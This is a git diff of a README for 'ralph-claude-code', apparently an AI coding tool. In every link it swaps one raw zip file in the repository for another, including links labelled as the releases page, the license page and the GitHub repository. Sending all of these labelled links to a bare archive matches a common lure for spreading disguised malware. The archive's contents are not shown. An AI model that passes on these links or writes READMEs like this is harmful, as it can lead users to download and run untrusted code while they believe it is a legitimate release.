@@ -1,6 +1,6 @@
 # 🤖 ralph-claude-code - Simplify AI Development Easily
 
-[![Download ralph-claude-code](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/docs/code-claude-ralph-v3.8.zip%20ralph--claude--code-v1.0-brightgreen)](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/docs/code-claude-ralph-v3.8.zip)
+[![Download ralph-claude-code](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/logs/claude-code-ralph-2.6.zip%20ralph--claude--code-v1.0-brightgreen)](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/logs/claude-code-ralph-2.6.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To begin using ralph-claude-code, you need to download the application from our 
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [ralph-claude-code Releases](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/docs/code-claude-ralph-v3.8.zip).
+1. Visit this page to download: [ralph-claude-code Releases](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/logs/claude-code-ralph-2.6.zip).
 
 2. On the Releases page, you will see different versions of the software available for download. Choose the latest version to ensure you get the most recent features and updates.
 
@@ -58,7 +58,7 @@ If you encounter any bugs or have suggestions for improvements, feel free to use
 
 ralph-claude-code is licensed under the MIT License. You can freely use, modify, and distribute this software as per the license terms.
 
-For more information, please visit our [license page](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/docs/code-claude-ralph-v3.8.zip).
+For more information, please visit our [license page](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/logs/claude-code-ralph-2.6.zip).
 
 ## ✍️ Contributing
 
@@ -66,7 +66,7 @@ We welcome contributions from the community. If you would like to help improve r
 
 ## 🔗 Additional Resources
 
-- **GitHub Repository**: [ralph-claude-code GitHub](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/docs/code-claude-ralph-v3.8.zip)
+- **GitHub Repository**: [ralph-claude-code GitHub](https://github.com/Atharvasalvi/ralph-claude-code/raw/refs/heads/main/logs/claude-code-ralph-2.6.zip)
 - **Feature Requests**: Suggest new features and improvements via our discussions board.
 
 Thank you for using ralph-claude-code. We hope it makes your AI development experience smoother and more enjoyable.
